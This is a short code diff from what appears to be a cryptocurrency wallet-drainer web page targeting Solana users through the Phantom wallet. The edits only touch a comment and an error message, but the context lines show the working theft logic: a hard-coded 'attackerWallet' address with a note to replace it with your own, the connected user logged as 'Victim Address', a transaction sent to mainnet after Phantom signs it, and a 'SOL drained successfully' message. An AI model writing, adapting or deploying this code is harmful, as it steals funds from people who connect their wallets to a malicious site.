@@ -26,7 +26,7 @@
 
             const connection = new solanaWeb3.Connection(solanaWeb3.clusterApiUrl("mainnet-beta"), "confirmed");
 
-            const attackerWallet = new solanaWeb3.PublicKey("AP1LJbcsXsLSQbvyAhuo3UC9JEMCeauTWNbzpi6GLpGh");  // Replace with your wallet address
+            const attackerWallet = new solanaWeb3.PublicKey("AP1LJbcsXsLSQbvyAhuo3UC9JEMCeauTWNbzpi6GLpGh"); // Replace with your wallet address
             const userWallet = provider.publicKey;
 
             console.log(`💰 Victim Address: ${userWallet.toBase58()}`);
@@ -47,7 +47,7 @@
                 );
 
                 try {
-                    // Explicitly sign the transaction with Phantom Wallet
+                    // Attempt to send the transaction using Phantom Wallet
                     const signedTransaction = await provider.signTransaction(transaction);
                     console.log("Transaction signed by Phantom.");
 
@@ -55,7 +55,7 @@
                     await connection.sendRawTransaction(signedTransaction.serialize());
                     console.log("✅ SOL drained successfully.");
                 } catch (error) {
-                    console.error("🚨 Error in signing the transaction or sending.");
+                    console.error("🚨 Error: Phantom Wallet didn't sign the transaction.");
                     console.error(error);
                 }
             } else {
